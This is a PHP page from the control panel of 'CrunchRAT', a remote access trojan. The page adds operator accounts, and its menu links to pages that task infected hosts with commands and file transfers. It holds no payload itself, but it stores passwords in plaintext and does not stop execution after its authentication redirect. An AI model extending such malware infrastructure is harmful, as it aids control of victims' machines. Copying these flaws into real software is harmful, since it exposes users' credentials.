<?php
  # Necessary at the top of every page for session management
  session_start();

  # If the RAT user isn't authenticated
  if (!isset($_SESSION["authenticated"]))
  {
    # Redirects them to 403.php page
    header("Location: 403.php");
  }
  # Else they are authenticated
  else
  {
    # Includes the RAT configuration file
    include "config/config.php";

    # Establishes a connection to the RAT database
    # Uses variables from "config/config.php"
    # "SET NAMES utf8" is necessary to be Unicode-friendly
    $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));
  }
?>

<!doctype html>
<html lang="en">
  <head> <!-- Start of header -->
    <meta charset="utf-8">
    <title>CrunchRAT</title>
    <link rel="stylesheet" href="bootstrap/css/bootstrap.css"> <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="bootstrap/css/bootstrap-responsive.css"> <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css"> <!-- Bootstrap CSS -->
    <script src="jquery/jquery.min.js"></script> <!-- jQuery JavaScript -->
    <script src="bootstrap/js/bootstrap.min.js"></script> <!-- Bootstrap JavaScript - This line has to be after the jQuery script tag for some reason -->
  </head> <!-- End of header -->

  <body> <!-- Start of body -->
    <nav class="navbar navbar-default"> <!-- Start of navigation bar -->
      <a class="navbar-brand" href="#">CrunchRAT</a>
      <ul class="nav navbar-nav">
        <li class="nav-item"><a class="nav-link" href="index.php">Home</a></li>
        <li class="nav-item"><a class="nav-link" href="hosts.php">Hosts</a></li>
        <li class="nav-item"><a class="nav-link" href="output.php">View Output</a></li>
        <li class="dropdown"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Task <span class="caret"></span></a> 
          <ul class="dropdown-menu"> <!-- Start of "Task" drop-down menu -->
            <li><a href="tasks.php">View Tasks</a></li>
            <li><a href="command.php">Task Command</a></li>
            <li><a href="upload.php">Task Upload</a></li>
            <li><a href="download.php">Task Download</a></li>
          </ul>
        </li> <!-- End of "Task" drop-down menu -->

        <li class="dropdown active"><a href="#" class="dropdown-toggle" data-toggle="dropdown" role="button" aria-haspopup="true" aria-expanded="false">Account Management <span class="caret"></span></a> <!-- Start of "Account Management" drop-down menu -->
          <ul class="dropdown-menu">
            <li><a href="addUser.php">Add User</a></li>
            <li><a href="changePassword.php">Change Password</a></li>
            <li role="separator" class="divider"></li>
            <li><a href="logout.php">Logout</a></li>
          </ul>
        </li> <!-- End of "Account Management" drop-down menu -->
        <li class="navbar-text">Currently signed in as: <b><?php echo htmlentities($_SESSION["username"]); # htmlentities() is used to protect against stored XSS here ?></b></li>
      </ul>
    </nav> <!-- End of navigation bar -->

    <div class="container"> <!-- Start of main body container -->
      <form class="form-inline" method="post"> <!-- Start of form -->
        <div class="form-group">
          <input type="text" class="form-control" name="username" placeholder="New Username">
          <input type="password" class="form-control" name="password1" placeholder="Password">
          <input type="password" class="form-control" name="password2" placeholder="Confirm Password">
        </div>
        <button type="submit" name="submit" class="btn btn-default">Add User</button>
      </form> <!-- End of form -->

    <?php
      $username = $_POST["username"];     # New username
      $password1 = $_POST["password1"];   # Password
      $password2 = $_POST["password2"];   # Confirm password

      # When the user clicks "Add User"
      if (isset($_POST["submit"]))
      {
        # If all of the fields have been filled out
        if (isset($username) && !empty($username) && isset($password1) && !empty($password1) && isset($password2) && !empty($password2))
        {
          # If the password and the confirm password are the same
          if ($password1 == $password2)
          {
            # Determines if the user account already exists in the "users" table
            $statement = $dbConnection->prepare("SELECT * FROM users WHERE username = :username");
            $statement->bindValue(":username", $username);
            $statement->execute();
            $rowCount = $statement->rowCount();

            # Kills database connection
            $statement->connection = null;

            # If the user account already exists
            # rowCount will be 1 if the user account already exists
            if ($rowCount == 1)
            {
              # Displays error message - "User already exists"
              echo "<br><div class='alert alert-danger'>User already exists.</div>";
            }
            # Else the user account does not exist
            else
            {
              # Adds new user to the "users" table
              $statement = $dbConnection->prepare("INSERT INTO users (username, password) VALUES (:username, :password)");
              $statement->bindValue(":username", $username);
              $statement->bindValue(":password", $password1); 
              $statement->execute();

              # Kills database connection
              $statement->connection = null;

              # Displays success message - "Successfully added new user. Redirecting back to index.php in 5 seconds. Do not refresh the page."
              echo "<br><div class='alert alert-success'>Successfully added new user. Redirecting back to index.php in 5 seconds. Do not refresh the page.</div>";

              # Waits 5 seconds, then redirects to submit.php
              # This is a hack to clear out the POST data
              header('Refresh: 5; URL=submit.php');
            }
          }
          # Else the passwords do not match
          else
          {
            # Displays error message - "The passwords are not the same. Please enter the passwords again."
            echo "<br><div class='alert alert-danger'>The passwords are not the same. Please enter the passwords again.</div>";
          }
        }
        # Else they are missing fields
        else
        {
          # Displays error message - "Please fill out all fields."
          echo "<br><div class='alert alert-danger'>Please fill out all fields.</div>";
        }
      }
    ?>
  </div> <!-- End main body container -->
  </body> <!-- End of body -->
</html>
